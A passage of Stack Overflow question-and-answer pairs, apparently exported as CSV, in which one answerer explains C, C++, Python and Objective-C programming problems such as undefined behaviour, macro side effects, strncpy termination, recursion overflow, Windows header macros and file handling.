        call_function();
    }
    return 0;
}
...
pthread_t tid;
pthread_create(&amp;tid, NULL, &amp;threadproc, NULL);
</code></pre>

<p>Or, you could set an alarm with <a href=""http://linux.die.net/man/2/alarm"" rel=""nofollow""><code>alarm(2)</code></a> or <a href=""http://linux.die.net/man/2/setitimer"" rel=""nofollow""><code>setitimer(2)</code></a>:</p>

<pre><code>void on_alarm(int signum)
{
    call_function();
    if(!done)
        alarm(delay_in_seconds);  // Reschedule alarm
}
...
// Setup on_alarm as a signal handler for the SIGALRM signal
struct sigaction act;
act.sa_handler = &amp;on_alarm;
act.sa_mask = 0;
act.sa_flags = SA_RESTART;  // Restart interrupted system calls
sigaction(SIGALRM, &amp;act, NULL);

alarm(delay_in_seconds);  // Setup initial alarm
</code></pre>

<p>Of course, both of these methods have the problem that the function you're calling periodically needs to be thread-safe.</p>

<p>The signal method is particularly dangerous because it must also be async-safe, which is very hard to do -- even something as simple as <code>printf</code> is unsafe because <code>printf</code> might allocate memory, and if the <code>SIGALRM</code> interrupted a call to <code>malloc</code>, you're in trouble because <code>malloc</code> is not reentrant.  So I wouldn't recommend the signal method, unless all you do is set a flag in the signal handler which later gets checked by some other function, which puts you back in the same place as the threaded version.</p>
"
"<p>I cant get enum this to work properly on Windows. While compiling on linux it returns expected value, but on windows it returns some random number.</p>

<pre><code>typedef enum wezly {
    elektrownie1,
    konwencjonalne1,
    niekonwencjonalne1,
    weglowa1,
    jadrowa1,
    sloneczna1,
    wiatrowa1,
    geotermiczna1,
    gazowa1,
    wodna1,
    maremotoryczna1,
    maretermiczna1
};

wezly wybor_wezla(string opcja)
{
    string bb;
    bb = opcja;

    if ((bb.compare(""[elektrownie]"")==0)||(bb.compare(""[ELEKTROWNIE]"")==0))
        return elektrownie1;
    else if ((bb.compare(""[konwencjonalne]"")==0)||(bb.compare(""[KONWENCJONALNE]"")==0))
        return konwencjonalne1;
    else if ((bb.compare(""[gazowa]"")==0)||(bb.compare(""[GAZOWA]"")==0))
        return gazowa1;
    else if ((bb.compare(""[wodna]"")==0)||(bb.compare(""[WODNA]"")==0))
        return wodna1;
    // (and so on...)
}

int main()
{

    cout &lt;&lt; wybor_wezla(""[gazowa]"");
}
</code></pre>

<p>When on linux i get 7, on windows its some random number....</p>

<p>Why can that be ?</p>
","9530","","<p>Your code is missing a final <code>else</code> clause:</p>

<pre><code>wezly wybor_wezla(string opcja)
{
    if(...)
        return ...;
    else if(...)
        return ...;
    else if(...)
        return ...;
    // No final else!
}
</code></pre>

<p>When none of the <code>if</code> clauses are true, it falls off the end of the function without returning a value, which is <em>Undefined Behavior</em>.  In this case, it's returning a garbage value, but worse stuff could happen.</p>

<p>Your first action should be to add a final <code>else</code> clause.  This can return a default value, an error code, throw an exception, <code>abort()</code>, etc., but it <em>cannot do nothing</em>.  If you know the value has to be one of a limited set of things, you could change the final <code>else if</code> into just an <code>else</code> and assume that if it's not the first <code>N-1</code> things, it's the <code>Nth</code> thing.</p>

<p>Once you've done that, you need to figure out why your data isn't falling into one of the expected cases and fix that.</p>
"
"<p>I was reading the C programming book by Kernighan and and came across this thing. The difference between the two or their respective usage criteria. I found some posts on StackOverflow which dealt with this issue. I got a part of my answer but with a little trouble understanding them.</p>

<p>As they mentioned here (http://stackoverflow.com/questions/4563825/putc-needs-stdout-vs-puts) :</p>

<blockquote>
  <ol>
  <li><p>According to Kernighan's book <code>putc</code> is equivalent to <code>fputc</code> but <code>putc</code> could be implemented as a macro and <code>putc</code> may evaluate its stream argument more than once.</p></li>
  <li><p>The difference between <code>putc</code> and <code>fputc</code> is that by using <code>putc</code>, you risk running the macro version which is inherently unsafe because it may have to evaluate its stream argument more than once. This causes complications that most people aren't aware of and thus do not watch out for, so <code>fputc</code> is better to use. <code>fputc</code>'s macro does not have this problem.</p></li>
  </ol>
</blockquote>

<p><strong>Questions:</strong></p>

<ol>
<li><p><code>putc</code> can be implemented as a macro but what is the problem doing same with <code>fputc</code>?</p></li>
<li><p>The second statement mentions of some complications and safety issues. What are those?</p></li>
<li><p><code>putc</code> evaluates its argument more than once. So what are the advantages or disadvantages it poses compared to evaluating the argument.</p></li>
</ol>
","9530","","<p>The issue with a macro implementation is that if any of the arguments have side effects, <em>those side effects may be evaluated more than once</em>, possibly leading to <em>undefined behavior</em>.  Consider this toy example:</p>

<pre><code>#define SQUARE(x) ((x) * (x))
</code></pre>

<p>Most of the time, this will function as expected, but if you pass in an expression such as <code>f()</code>, then the side effect of calling the function <code>f()</code> will happen <em>twice</em>, not <em>once</em>, since the preprocessor is just a text transformer which is ignorant of C:</p>

<pre><code>int f()
{
    printf(""f() was called\n"");
    return 42;
}
...
int x = SQUARE(f());  // This calls f() twice!  It gets expanded to this:
// int x = (f() * f());
</code></pre>

<p>To put this in perspective, the <code>putc</code> function, if implemented as a macro, may evaluate its <code>stream</code> argument more than once.  So, if that stream comes from a function:</p>

<pre><code>FILE *get_file()
{
    // Potential side effects could happen here
    return some_file;
}
...
putc('A', get_file());
</code></pre>

<p>Then that could result in the function <code>get_file()</code> getting called more than once, with potentially unwanted side effects.</p>

<p>The solution, of course, is to just call a regular function like <code>fputc()</code> instead of <code>putc()</code>.  Since it's not a macro, it doesn't have any potential problems with evaluating its arguments more than once.  Macros can be dangerous sometimes, so use them with care.</p>
"
"<pre><code>#include &lt;iostream&gt;
using namespace std 
#include &lt;string.h&gt;
int main(){
    char token[] = ""some random string"";
    char c[23];  
    strcpy( c, token);
    strncpy(c, token, 5); 
    c[strlen(c)] = '\0';
    cout&lt;&lt;c;
    return 0 ;
}
</code></pre>

<p>My output is: <code>some random string</code>. But I expect it to be: <code>some</code>. Can anyone please explain why it is behaving like this?</p>
","9530","","<p>It's working just fine—bear in mind that <a href=""http://stackoverflow.com/questions/1453876/why-does-strncpy-not-null-terminate""><code>strncpy</code> does not necessarily null-terminate the string</a>.  When you do this:</p>

<pre><code>strncpy(c, token, 5);
</code></pre>

<p>It copies the first 5 bytes of <code>token</code> into <code>c</code> <em>but does not null-terminate the result</em>.  Furthermore, this line is useless:</p>

<pre><code>c[strlen(c)] = '\0';
</code></pre>

<p><code>strlen(c)</code> looks for an existing null terminator, and as soon as you find one, you overwrite it with another null terminator, which is pointless.</p>

<p>In new code, <code>strncpy</code> should <em>seldom, if ever</em> be used.  Its intended use (fixed-length buffers which are not necessarily null-terminated) have long been obseleted.  Prefer instead a function like <a href=""http://www.openbsd.org/cgi-bin/man.cgi?query=strlcpy&amp;sektion=3""><code>strlcpy</code></a> (note: <code>strlcpy</code> is not standard; it's only available in BSD-like systems).</p>

<p>Or, if you're coding in C++ instead of pure C, just use <code>std::string</code> and avoid tricky issues like this altogether.</p>
"
"<pre><code>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

int main(int argc, char* argv[])
{
    struct tm stm;
    stm.tm_sec = 27;
    stm.tm_min = 5;
    stm.tm_hour = 18;
    stm.tm_mday = 2;
    stm.tm_mon = 0;
    stm.tm_year = 43;
    stm.tm_wday = 0;
    stm.tm_yday = 0;
    printf(""%d\n"", mktime(&amp;stm));
    getchar();
    return 0;
}
</code></pre>

<p>prints -1</p>

<p>What am I misunderstanding?</p>

<p>[+edit] this is using Visual Studio 2012 with 32 bit target. I guess a follow up question would be 'what is the recommended method for storing arbitrary date/time values (i.e. those which may be before 1900)?'</p>
","9530","","<p><code>time_t</code> is a 64-bit integer on your system and you're using the wrong format flag specifier to print it out.  You need to use the <code>ll</code> modifier to indicate that it's 64 bits:</p>

<pre><code>time_t t = mktime(&amp;stm);
printf(""%lld"", (int64_t)t);  // This will be correct if time_t is 32 or 64 bits
</code></pre>

<p>Since the time is before the epoch (January 1, 1970), the time is a negative value like -851910873, which is 0xffffffffcd38df27 in hex as a 64-bit integer.  When you try to print it out as a 32-bit integer, you get the upper 32 bits, which is 0xffffffff or -1 (although technically this is undefined behavior according to the C standard, so don't rely on this).</p>

<p>As others have mentioned, the actual size of <code>time_t</code> is not specified, so you shouldn't make any assumptions about it.  The safest thing to do is to always widen it to 64 bits if you really need to know how big it is.</p>
"
"<p>I want a quick and dirty way of determining what language the user is writing in. I know that there is a Google API which will detect the difference between French and Spanish (even though they both use mostly the same alphabet), but I don't want the latency. Essentially, I know that the Latin alphabet has a lot of confusion as to what language it is using. Other alphabets, however, don't. For example, if there is a character using hiragana (part of the Japanese writing system) there is no confusion as to the language. Therefore, I don't need to ask Google.</p>

<p>Therefore, I would like to be able to do something simple like say that <code>שלום</code> uses the Hebrew alphabet and <code>こんにちは</code> uses Japanese characters. How do I get that alphabet string?</p>

<p>""Bonjour"", ""Hello"", etc. should return ""Latin"" or ""English"" (Then I'll ask Google for the real language). ""こんにちは"" should return ""Hiragana"" or ""Japanese"". ""שלום"" should return ""Hebrew"".</p>
","9530","","<p>I'd suggest looking at the <a href=""http://www.unicode.org/reports/tr24/"" rel=""nofollow"">Unicode ""Script"" property</a>.  The latest database can be found <a href=""http://www.unicode.org/Public/UNIDATA/Scripts.txt"" rel=""nofollow"">here</a>.</p>

<p>For a quick and dirty implementation, I'd try scanning all of the characters in the target text and looking up the script name for each one.  Pick whichever script has the most characters.</p>
"
"<p>As per the python documentation <a href=""http://docs.python.org/2/library/zipfile#zipfile.is_zipfile"" rel=""nofollow""><code>zipfile.is_zipfile(filename)</code></a> function returns True if filename is a valid ZIP file else False.</p>

<p>I have written my script as below and initially passed one argument and get ""False"" as result, But for other valid arguments also I am getting <code>False</code> all the time.</p>

<h3>Script:</h3>

<pre><code>import zipfile

for filename in [ r'D:\Python_Programs\B1', r'D:\Python_Programs\B2', r'D:\Python_Programs\B1+B2\20130105\144145_1.zip', 'NEWS.txt']:
    print (filename, zipfile.is_zipfile(filename))
</code></pre>

<h3>Result:</h3>

<pre><code>D:\Python_Programs\B1 False
D:\Python_Programs\B2 False
D:\Python_Programs\B1+B2\20130105\144145_1.zip False
NEWS.txt False
</code></pre>

<p>Can anyone help me out why I am getting False every time??</p>
","9530","","<p>As determined from the comments, <code>is_zipfile</code> is returning <code>False</code> because the file really isn't a zip file—it's a RAR file in disguise.  The file extension can be unwittingly changed.  WinRAR is able to deal with both zip and RAR files, so it can open the file regardless of its actual extension, but programs that only deal in zip files can't open it.</p>

<p>File types can usually be identified by examining the first several bytes of files and looking for various so-called magic constants.  This is exactly the purpose of the Unix utility <a href=""http://linux.die.net/man/1/file"" rel=""nofollow""><code>file(1)</code></a>.  A zip file is <em>usually</em> identified by the two magic bytes <code>PK</code> (more specifically, the four bytes 0x50 0x4B 0x74 0x08) at the beginning, although zip files have the special property that they're actually identified by a particular data structure at the <em>end</em> of the file.  The result of that is some interesting steganographic techniques such as <a href=""http://gayhacker.wordpress.com/2009/04/03/well-well-well/"" rel=""nofollow"">this trick</a>.  But you won't see that too often in practice—almost all (if not all) standard zip tools create zip files that start with <code>PK</code>.</p>
"
"<p>Can tell somebody what this mean in C++? (is in front of a function)
Also how I find something about this issue.</p>

<pre><code>__attribute__ ((noinline)) 
</code></pre>

<p>Thank you . Regards</p>
","9530","","<p>GCC defines a number of different non-standard <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html"" rel=""nofollow"">function attributes</a> used for indicating special features of functions.  These are usually used for optimization or dealing with platform-specific features.</p>

<p>In this case, the <code>noinline</code> attribute means ""don't inline this function under any circumstances"", when the optimizer might otherwise inline it.</p>
"
"<p>I am trying to copy a source code tree using the below code and running into an error,am not sure why I am getting this?error says \\Ref\builds/out exists but it doesnt exist,""out"" is the directory the source location that the script is trying to copy to destination,any other ways to do copy if shutil is not suited for this type of copy?</p>

<pre><code>//local/mnt/workspace/04.01_HY11/out
\\Ref\builds/out
copying
Traceback (most recent call last):
  File ""test.py"", line 21, in &lt;module&gt;
    main()
  File ""test.py"", line 18, in main
    copytree(src,dst)
  File ""test.py"", line 11, in copytree
    shutil.copytree(s, d)
  File ""/pkg/qct/software/python/2.5.2/.amd64_linux26/lib/python2.5/shutil.py"", line 110, in copytree
    os.makedirs(dst)
  File ""/pkg/qct/software/python/2.5.2/.amd64_linux26/lib/python2.5/os.py"", line 171, in makedirs
    mkdir(name, mode)
OSError: [Errno 17] File exists: '\\\\Ref\\builds/out'
</code></pre>

<p>Python code</p>

<pre><code>import os,shutil

def copytree(src, dst, symlinks=False, ignore=None):
    for item in os.listdir(src):
        s = os.path.join(src, item)
        print s
        d = os.path.join(dst, item)
        print d
        if os.path.isdir(s):
            print ""copying""
            shutil.copytree(s, d, symlinks, ignore)
        else:
            shutil.copy2(s, d)
def main ():
    src=""//local/mnt/workspace/04.01_HY11""
    dst=""\\\\Ref\\builds""
    copytree(src,dst)

if __name__ == '__main__':
    main()
</code></pre>
","9530","","<p>The <a href=""http://docs.python.org/2/library/shutil.html#shutil.copytree"" rel=""nofollow"">documentation for <code>shutil.copytree</code></a> clearly says:</p>

<blockquote>
  <p>The destination directory, named by <code>dst</code>, must not already exist; it will be created as well as missing parent directories.</p>
</blockquote>

<p>But <code>\\ref\builds\out</code> already exists—you can see from the exception's stack trace that it's trying to <code>mkdir</code> that path, but that's failing with an error indicating that that path already exists (which can happen when the path exists as either a regular file or a directory).</p>

<p>You need to copy to path that doesn't already exist, by either choosing a different path, or by deleting the existing tree at that location first.  The latter can be done with <code>shutil.rmtree</code>.</p>
"
"<p>I'm trying to do a program that creates various filters through webcam feed and ran into some issues with BLOB-analysis and some other. </p>

<p>I'm getting segFault everytime I activate my grassfire function. 
Here's the code for my grassfire function:</p>

<pre><code>void testApp::grassFire(int mask_Y, int mask_X, unsigned char labelCnt)
{
    blobArray[mask_Y * camWidth + mask_X] = labelCnt;
    if (mask_X + 1 &lt;= camWidth - 1 &amp;&amp; blobArray[mask_Y * camWidth + mask_X + 1] == 0)
       grassFire(mask_Y, mask_X + 1, labelCnt);
    if (mask_Y + 1 &lt;= camHeight - 1 &amp;&amp; blobArray[(mask_Y + 1) * camWidth + mask_X] == 0)
       grassFire(mask_Y + 1, mask_X, labelCnt);
    if (mask_X - 1 &gt;= 0 &amp;&amp; blobArray[mask_Y * camWidth + mask_X - 1] == 0)
       grassFire(mask_Y, mask_X - 1, labelCnt);
    if (mask_Y - 1 &gt;= 0 &amp;&amp; blobArray[(mask_Y - 1) * camWidth + mask_X] == 0)
       grassFire(mask_Y - 1, mask_X, labelCnt);
}
</code></pre>

<p>And how it is called is by a switch case that runs every frame <strong>This means it gets called every frame update</strong></p>

<p>The function itself is declared outside any other scope.</p>

<p>I know it is a really heavy filter and it might be using a lot of memory, but compared to some of the other filters, it's not that bad, so I cannot figure out why i get the segFault. </p>

<p>I also get the segFault on another filter, that shouldn't be that memory usage demanding. 
I'm using openframeworks in codeblocks on win 7. </p>
","9530","","<p>If you have a lot of array values of 0, you're probably getting a stack overflow due to the heavily recursive nature of the function.  I'd suggest trying an <a href=""http://stackoverflow.com/questions/1257117/does-anyone-have-a-working-non-recursive-floodfill-algorithm-written-in-c"">iterative flood fill algorithm</a> instead and see if that fixes the problem.</p>
"
"<p>I get a start_date like this:</p>

<pre><code>from django.utils.timezone import utc
import datetime

start_date = datetime.datetime.utcnow().replace(tzinfo=utc)
end_date = datetime.datetime.utcnow().replace(tzinfo=utc)
duration = end_date - start_date
</code></pre>

<p>I get output like this:</p>

<pre><code>datetime.timedelta(0, 5, 41038)
</code></pre>

<p>How do I convert this into normal time like:</p>

<p>10 minutes, 1hour like this</p>
","9530","","<p>A <code>datetime.timedelta</code> corresponds to the <em>difference</em> between two dates, not a date itself.  It's only expressed in terms of days, seconds, and microseconds, since larger time units like months and years don't decompose cleanly (is 30 days 1 month or 0.9677 months?).</p>

<p>If you want to convert a <code>timedelta</code> into hours and minutes, you can use the <a href=""http://docs.python.org/2/library/datetime.html#datetime.timedelta.total_seconds"" rel=""nofollow""><code>total_seconds()</code></a> method to get the total number of seconds and then do some math:</p>

<pre><code>x = datetime.timedelta(1, 5, 41038)  # Interval of 1 day and 5.41038 seconds
secs = x.total_seconds()
hours = int(secs / 3600)
minutes = int(secs / 60) % 60
</code></pre>
"
"<p>I am trying to write a c code to scan an entire directory for files ending with .wor, open each file and extract certain info from them.<br>
So far my code successfully opens ALL files with in that directory, and scans them for the target words.  Is there a way for me to modify the code so it would scan only files ending with .wor?  I have tried the wildcard ""*.wor"" but it just gives me an error saying the symbol * and .wor is not recognized.<br>
Thank you very much for the help!<br>
(Btw I could not get the counter i added at the end to work either, im trying to use the integer ""c"" to increment each time a file is read, and display a total number of files read at the end.  It just gives me 0 right now.)</p>

<p>Here is my code:</p>

<pre><code>    #include &lt;stdio.h&gt;
    #include &lt;string.h&gt;
    #include &lt;stdlib.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;dirent.h&gt;
    #include &lt;unistd.h&gt;
    #include &lt;errno.h&gt;

    int main(int argc, char **argv) {

char file[100];
char buff[100];
char delims[] = "" :="";
char *result = NULL;
char *customer;
char *device;
char *testprog;
char *software;
char *dutboardid;
char *corlbox;
int i=0;
DIR * FD;
struct dirent* in_file;
int c = 0;


    FILE * ft = fopen ( ""WorkOrderInfo.csv"", ""w"" ) ;    /* Open file to write to*/
    if ( ft == NULL )
    {
           puts ( ""Cannot open target file"" ) ;
           exit( 1 ) ;
    }

    fprintf (ft, ""Work Order,Customer,Device,Test_Prog,Software,DUT_board_id,Corl box\n"");



/* Open Directory*/

if (NULL == (FD = opendir (""/home/iselabs/dwang/pinscale/workorder/practice""))) 
    {
    fprintf(stderr, ""Error : Failed to open input directory - %s\n"");
    fclose(ft);

    return 1;
    }


    while ((in_file = readdir(FD))) 
    {

    if (!strcmp (in_file-&gt;d_name, "".""))
        continue;
    if (!strcmp (in_file-&gt;d_name, ""..""))    
        continue;


    /* Open files to read from  */


    FILE * fs = fopen(in_file-&gt;d_name, ""r"");
    if (fs == NULL)
    {
        puts (""Cannot open source file"");

        return 1;
    }

    /* Scanning each file for targeted words: */


while( fgets(buff, 100,fs) != NULL )      
{   
 result = strtok( buff, delims );          
    while(result != NULL){                   
            if((strcmp(result,""Customer"")==0)){ 
        result = strtok(NULL,delims);  
        customer = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(customer, result);
        for(i=0;i&lt;strlen(customer)+1;i++){ if(customer[i] == '\n') break; }
        customer[i] = ' ';
        }


            if((strcmp(result,""name"")==0)){ 
        result = strtok(NULL,delims);  
        customer = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(customer, result);
        for(i=0;i&lt;strlen(customer)+1;i++){ if(customer[i] == '\n') break; }
        customer[i] = ' ';
        }

            if(strcmp(result,""device"")==0){ 
        result = strtok(NULL,delims);  
        device = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(device, result);
        for(i=0;i&lt;strlen(device)+1;i++){ if(device[i] == '\n') break; } 
        device[i] = ' ';
        }


            if(strcmp(result,""test_prog"")==0){ 
        result = strtok(NULL,delims);  
        testprog = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(testprog, result);
        for(i=0;i&lt;strlen(testprog)+1;i++){ if(testprog[i] == '\n') break; } 
        testprog[i] = ' ';
        }

            if(strcmp(result,""Rev"")==0 || strcmp(result,""use"")==0){ 
        result = strtok(NULL,delims);  
        software = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(software, result);
        for(i=0;i&lt;strlen(software)+1;i++){ if(software[i] == '\n') break; } 
        software[i] = ' ';
        }

        if(strcmp(result,""rev"")==0){ 
        result = strtok(NULL,delims);  
        software = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(software, result);
        for(i=0;i&lt;strlen(software)+1;i++){ if(software[i] == '\n') break; } 
        software[i] = ' ';
        }

            if(strcmp(result,""DUT_board_id"")==0){ 
        result = strtok(NULL,delims);  
        dutboardid = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(dutboardid, result);
        for(i=0;i&lt;strlen(dutboardid)+1;i++){ if(dutboardid[i] == '\n') break; } 
        dutboardid[i] = ' ';
        }                   
        else if (strcmp(result,""DUT_board_id"")==1){
        corlbox = ""N/A"";
        }

            if(strcmp(result,""box"")==0){ 
        result = strtok(NULL,delims);  
        corlbox = (char*)malloc((strlen(result)+1)*sizeof(char));
        strcpy(corlbox, result);
        for(i=0;i&lt;strlen(corlbox)+1;i++){ if(corlbox[i] == '\n') break; } 
        corlbox[i] = ' ';
        }
        else if (strcmp(result,""box"")==1){
        corlbox = ""N/A"";
        }           
        result = strtok(NULL,delims);
    }

}


fprintf (ft, ""%s,%s,%s,%s,%s,%s,%s\n"", file, customer, device, testprog, software, dutboardid, corlbox);


fclose (fs) ;
printf(""hey\n"");
c = c++;                             /*Increments c by 1 every time a file is read */
}

printf(""total files scanned: %d \n"", c);
    fclose ( ft ) ;
return 0;
</code></pre>

<p>}</p>
","9530","","<p>You can manually check if each filename ends in <code>.wor</code> like this:</p>

<pre><code>size_t len = strlen(in_file-&gt;d_name);
if (len &gt;= 4 &amp;&amp; memcmp(in_file-&gt;d_name + len - 4, "".wor"", 4) == 0)
{
    // The filename ends in "".wor"" (case-sensitive).  Note that this also
    // accepts the file whose entire name is "".wor"".
}
</code></pre>

<p>Alternatively, you can instead use the <a href=""http://linux.die.net/man/3/glob"" rel=""nofollow""><code>glob(3)</code></a> function to get the list of filenames matching a particular wildcard:</p>

<pre><code>// Error checking omitted for expository purposes
glob_t globbuf;
glob(""/home/iselabs/dwang/pinscale/workorder/practice/*.wor"", 0, NULL, &amp;globbuf);

for (size_t i = 0; i &lt; globbuf.gl_pathc; i++)
{
    char *filename = globbuf.gl_pathv[i];
    // Process filename...
}

globfree(&amp;globbuf);
</code></pre>
"
"<p>I've seen <a href=""http://stackoverflow.com/questions/7643528/how-many-usage-does-volatile-keyword-have-in-c-function-from-grammar-perspe"">How many usage does &quot;volatile&quot; keyword have in C++ function, from grammar perspective?</a> about use of the volatile keyword on functions, but there was no clear explanation of what Case 1 from that question did.  Only a statement by one of the respondents that it seemed pointless/useless.</p>

<p>Yet I cannot quite accept that statement, since the AES software implementations for GNUC have been used for literally years, and they have a number of functions like this:</p>

<pre><code>INLINE volatile void functionname( /* ... */ ) {
    /* ... */
    asm( /* ... */ ) // embedded assembly statements
    /* ... */
}
</code></pre>

<p>There has to have been a reason for that usage.  Can anyone:</p>

<p><strong>A</strong>. tell me what the original reason was; and</p>

<p><strong>B</strong>. how to achieve the desired effect now?</p>

<p>I'm using Ubuntu, and GCC 4.6.3.</p>

<p><hr />
<i>Note:</i>  The closest I've come to an explanation is that prior to GCC 2.5, you could spoof the 'noreturn' attribute that was implemented in 2.5 via the following:</p>

<pre><code>void fatal( /* ... */ ) { /* ... */ exit(1); }

typedef void voidfn ();

volatile voidfn fatal;
</code></pre>

<p>This would allow the compiler to recognize that 'fatal' was not going to return.</p>

<p>But that scenario doesn't appear to apply to the AES code.  It's been a long time since I did anything in assembly, but I think I'd recognize a jump or something like that.</p>
","9530","","<p>The C99 standard says this in §6.7.3/3:</p>

<blockquote>
  <p>The properties associated with qualified types are meaningful only for expressions that
  are lvalues.<sup>114)</sup></p>
  
  <p>114) The implementation may place a <code>const</code> object that is not <code>volatile</code> in a read-only region of storage. Moreover, the implementation need not allocate storage for such an object if its address is never used</p>
</blockquote>

<p>§6.2.5/19 says:</p>

<blockquote>
  <p>The <code>void</code> type comprises an empty set of values; it is an incomplete type that cannot be
  completed.</p>
</blockquote>

<p>And §6.3.2.1/1 says:</p>

<blockquote>
  <p>An <em>lvalue</em> is an expression with an object type or an incomplete type other than <code>void</code>;<sup>53)</sup> [...]</p>
</blockquote>

<p>Hence, <code>void</code> is not an lvalue, so the type qualifiers (<code>const</code>, <code>volatile</code>, and <code>restrict</code>) are not meaningful for expressions of type <code>void</code>.  So, in any C99-compliant compiler, <code>const void</code> and <code>volatile void</code> are meaningless (although <em>pointers</em> to <code>const void</code> and <code>const volatile</code> <em>are</em> meaningful).</p>

<p>Furthermore, the constraints of §6.9.1/3 disallow a function to return a qualified type of <code>void</code>:</p>

<blockquote>
  <p>The return type of a function shall be <code>void</code> or an object type other than array type.</p>
</blockquote>

<p>Since this is a constraint, a conforming compiler <em>must</em> issue a diagnostic (§5.1.1.3/1).  So a function returning <code>volatile void</code> is not allowed in C99.</p>

<p>As for what <code>volatile void</code> may have used to do, I have no idea and can't really speculate.  The AES code you're looking at probably just has old cruft that never got cleaned up, I'd guess.</p>
"
"<p><strong>EDIT</strong></p>

<p>To get around the problem, I added the following to the (beginning of the) header file:</p>

<pre><code>#ifdef GetMessage
#undef GetMessage
static inline BOOL GetMessage(
LPMSG lpMsg,
HWND hWnd,
UINT wMsgFilterMin,
UINT wMsgFilterMax
) {
#if UNICODE
return ::GetMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
#else
return ::GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
#endif
}
#endif
</code></pre>

<hr>

<p>I'm creating a C++ DLL (using Visual Studio 2008) from code like the following:</p>

<p>Header File:</p>

<pre><code>#include &lt;windows.h&gt; // Edit: This is the culprit.
class __declspec(dllexport) TestBaseClass
{
protected:
   char m_Message[512];
public:
   TestBaseClass();
   virtual char* GetMessage(void) = 0;
};

class __declspec(dllexport) TestDerivedClass : public TestBaseClass
{
public:
   TestDerivedClass();
   virtual char* GetMessage(void);
};
</code></pre>

<p>CPP File:</p>

<pre><code>TestBaseClass::TestBaseClass()
{
}

TestDerivedClass::TestDerivedClass() : TestBaseClass()
{
}

char* TestDerivedClass::GetMessage(void)
{
   sprintf(m_Message, ""This is a Message"");
   return m_Message;
}
</code></pre>

<p>When I go to compile the DLL, I get a linker error:</p>

<blockquote>
  <p>error LNK2001: unresolved external symbol ""public: virtual char *
  __thiscall TestDerivedClass::GetMessageA(void)"" (?GetMessageA@TestDerivedClass@@UAEPADXZ)</p>
</blockquote>

<p>If I change every instance of ""GetMessage"" to something else (e.g. ""TestFunc""), I do not get the linker error.</p>

<p><strong>Primary Question</strong>: Why can't I use ""GetMessage"" as my function name?</p>

<p><strong>Secondary Question</strong>: Is there a way to resolve the linker error, and keep ""GetMessage"" in my class, as currently defined?</p>
","9530","","<p>It's due to a quirk in the Windows headers.  When you <code>#include &lt;windows.h&gt;</code>, it <code>#define</code>s the symbol <code>GetMessage</code> to either <code>GetMessageA</code> or <code>GetMessageW</code>, depending on whether or not you have Unicode support enabled (more specifically, if the <code>UNICODE</code> macro is defined) -- see <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd374089%28v=vs.85%29.aspx"" rel=""nofollow"">Unicode in the Windows API</a> and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd317766%28v=vs.85%29.aspx"" rel=""nofollow"">Conventions for Function Prototypes</a> for more info on that.</p>

<p>To work around this, you have a few options:</p>

<ul>
<li>Don't include the Windows headers</li>
<li>Define the macro <a href=""http://stackoverflow.com/questions/1394910/how-to-tame-the-windows-headers-useful-defines""><code>NOMSG</code></a> before include <code>&lt;windows.h&gt;</code> -- this will suppress the declarations of various message-related functions and macros</li>
<li><code>#undef GetMessage</code> before your class definition</li>
<li>Rename your function to something else</li>
</ul>
"
"<p>I know there are many makefile ""Missing Separator"" errors already on SO, but my makefile looks like the solution to those other questions so I am not sure what to do. Here is the file:</p>

<pre><code>main: main.cpp
  g++ main.cpp -o main
</code></pre>

<p>I haven't written a makefile in a while so I am just trying to get it to work with a simple main.cpp, however the above code does not work. it says:</p>

<pre><code>makefile:2: *** missing separator.  Stop.
</code></pre>

<p>And yes, there IS a tab before g++</p>

<p>hexdump -C makefile yields:</p>

<pre><code>00000000  6d 61 69 6e 3a 20 6d 61  69 6e 2e 63 70 70 0a 20  |main: main.cpp. |
00000010  20 67 2b 2b 20 6d 61 69  6e 2e 63 70 70 20 2d 6f  | g++ main.cpp -o|
00000020  20 6d 61 69 6e                                    | main|
00000025
</code></pre>

<p>In my editor I found these preferences:</p>

<p>tab_widths: 
  Default: 2
  Plain Text: 2
  Makefile: 2
  C++: 2
  YAML: 2</p>

<p>could the tab_width be too small for makefile?</p>
","9530","","<p>No, there's really not a hard tab character.  Your editor is inserting spaces instead, even if you're hitting the tab key on your keyboard.  You need to configure your editor to insert hard tabs (<code>09</code> in ASCII) instead.  I've never used Redcar, so I don't know how to do that.</p>
"
"<p>How can I download file from internet in mac osx using objective c.I tried using <code>copyItemAtURL:toURL:error:</code> method in <code>NSFileManager</code> but did not worked.The domain is public so no authentication needed. </p>
","9530","","<p><code>NSFileManager</code> doesn't support HTTP URLs.  You'll need to use the <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40003755"" rel=""nofollow""><code>NSURLConnection</code></a> class to perform the HTTP request.</p>

<p>If you want to perform a synchronous HTTP request (e.g. for a console application or on a background thread of a GUI application), then the basic workflow is:</p>

<ol>
<li>Construct an <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLRequest_Class/Reference/Reference.html"" rel=""nofollow""><code>NSURLRequest</code></a> for your desired URL</li>
<li>Call <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40003755"" rel=""nofollow""><code>+[NSURLConnection sendSynchronousRequest:returningResponse:error:]</code></a></li>
<li>Call <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSFileManager_Class/Reference/Reference.html"" rel=""nofollow""><code>-[NSFileManager createFileAtPath:contents:attributes:]</code></a> to save the resulting <code>NSData</code> to your desired destination file.</li>
</ol>

